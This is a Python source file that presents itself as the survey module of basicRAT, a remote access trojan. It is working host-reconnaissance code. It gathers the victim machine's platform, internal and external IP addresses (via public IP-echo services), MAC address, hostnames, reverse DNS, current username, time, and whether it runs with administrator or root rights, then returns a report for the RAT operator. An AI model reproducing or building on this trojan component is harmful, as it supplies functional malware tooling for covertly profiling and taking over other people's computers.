# -*- coding: utf-8 -*-
# @Title   : 
# @Time    : 2018/7/16 10:15
# @Author  : Xifeng2009
# @Email   : 834935292@qq.com
# @File    : survey.py
# @Software: PyCharm

#
# basicRAT survey module
# https://github.com/vesche/basicRAT
#

import ctypes
import getpass
import os
import platform
import socket
import time
import urllib.request
import uuid

SURVEY_FORMAT = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Internal Hostname   - {}
    External Hostname   - {}
    Hostname Aliases    - {}
    FQDN                - {}
    Current User        - {}
    System Datetime     - {}
    Admin Access        - {}
'''

def run(plat):
    # OS Information
    sys_platform = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]

    # Session Information
    username = getpass.getuser()

    # Network Information
    hostname = socket.gethostname()
    fqdn     = socket.getfqdn()
    try:
        internal_ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        internal_ip = ''
    raw_mac  = uuid.getnode()
    mac      = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))

    # Get Externam IP Address
    ex_ip_grab = [
        'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
        'ipecho.net/plain', 'myexternalip.com/raw', 'wtfismyip.com/text',
    ]
    external_ip = ''
    for url in ex_ip_grab:
        try:
            external_ip = urllib.request.urlopen('http://'+url).read().rstrip()
        except IOError:
            pass
        if external_ip and (6 < len(external_ip) < 16):
            break
    # Reverse DNS Lookup
    try:
        ext_hostname, aliases, _ = socket.gethostbyaddr(external_ip)
    except (socket.herror, NameError):
        ext_hostname, aliases = '', []
    aliases = ', '.join(aliases)

    # Datetime, Local Non-DST Timezone
    dt = time.strftime(
        "%a, %d %b %Y %H:%M:%S".format(time.tzname[0]),
        time.localtime()
    )
    # Platform Specific
    is_admin = False
    if plat == 'win':
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat in ['nix', 'mac']:
        is_admin = os.getuid() == 0

    admin_access = 'Yes' if is_admin else 'No'

    # Return Survey Results
    return SURVEY_FORMAT.format(
        sys_platform, processor, architecture, internal_ip,
        external_ip, mac, hostname, ext_hostname, aliases,
        fqdn, username, dt, admin_access
    )








